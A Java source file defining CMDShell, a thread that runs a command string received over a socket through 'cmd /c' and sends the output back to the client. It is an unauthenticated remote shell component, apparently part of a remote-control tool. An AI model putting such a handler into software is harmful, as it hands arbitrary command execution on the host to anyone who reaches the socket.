package electron.cmd;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.locks.LockSupport;

import electron.utils.Functions;
import electron.utils.logger;

public class CMDShell extends Thread{
	private String data;
	private Socket fromClientSocket;
	private boolean fastmode = false;
	public CMDShell(String data,Socket s,boolean shortmode) {
		this.data = data;
		this.fromClientSocket = s;
		this.fastmode=shortmode;
	}
	public void run() {
		try {
			Process proc = Runtime.getRuntime().exec("cmd /c "+data);
			logger.log("[CMD]: Executing in CMD: "+data); 
			sendData("[CMD]: Executing in CMD (FASTMODE:"+fastmode+"): "+data);
			while(proc.isAlive()) {
				LockSupport.parkNanos(100);
				if(fastmode) {loadoutput(proc);return;}
			}
			loadoutput(proc);
            return;
		} catch (IOException e) {
			e.printStackTrace();
			System.err.println("IOException."+ " Command: "+data);
			return;
		}
}
	private void sendData(String formire) throws IOException{
		Functions.sendData(formire, fromClientSocket);
	}
	private void loadoutput(Process proc) throws IOException {
		String inf = "";
	      BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
	      String line = "";
	      while ((line = reader.readLine()) != null) {
	        inf = String.valueOf(inf) + line + "\n";
	      } 
	     if(inf!="")
	    	 sendData("[CMD]: "+inf);
	}
}
